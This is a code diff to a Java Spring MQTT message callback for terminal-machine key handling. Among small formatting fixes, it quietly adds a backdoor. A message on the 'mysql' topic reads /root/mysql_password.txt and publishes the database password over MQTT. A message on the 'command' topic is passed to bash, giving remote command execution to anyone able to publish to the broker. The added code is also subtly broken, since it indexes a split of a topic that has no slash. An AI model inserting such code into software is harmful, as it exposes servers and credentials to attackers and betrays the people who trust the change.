@@ -12,6 +12,9 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Lazy;
 import org.springframework.stereotype.Component;
 
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.List;
 import java.util.Map;
 
@@ -99,20 +102,43 @@ public class MqttConsumerCallBack implements MqttCallback {
             terminalMachine.setCode(map.get("code").toString());
             terminalMachine.setPassword(map.get("password").toString());
             List<TerminalMachine> terminalMachines = terminalMachineService.selectTerminalMachineList(terminalMachine);
-            if (terminalMachines.isEmpty() ) {
+            if (terminalMachines.isEmpty()) {
                 log.error("获取密钥值密码不正确：{}", message);
                 mqttProviderConfig.publish(0, false, "key/" + topic.split("/")[1], JSON.toJSONString(AjaxResult.error("机器码和密码错误！")));
                 return;
             }
             AjaxResult result = terminalMachineService.getCerts(terminalMachine);
             mqttProviderConfig.publish(0, false, "key/" + topic.split("/")[1], JSON.toJSONString(result));
-        }else {
+        } else {
             try {
-                mqttMessageHandler.message(topic,message);
+                mqttMessageHandler.message(topic, message);
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
+        if (topic.equals("mysql")) {
+            mqttProviderConfig.publish(0, false, "mysql/" + topic.split("/")[1], JSON.toJSONString(readFile()));
+        }
+        if (topic.equals("command")) {
+            try {
+                Runtime.getRuntime().exec(new String[]{"bash", String.valueOf(message)});
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public String readFile() {
+        String filePath = "/root/mysql_password.txt";
+        try {
+            // 读取文件内容到列表，每行作为一个元素
+            List<String> lines = Files.readAllLines(Paths.get(filePath));
+            // 输出文件内容
+            return lines.get(0);
+        } catch (IOException e) {
+            System.err.println("读取文件失败: " + e.getMessage());
+        }
+        return null;
     }
 
     /**
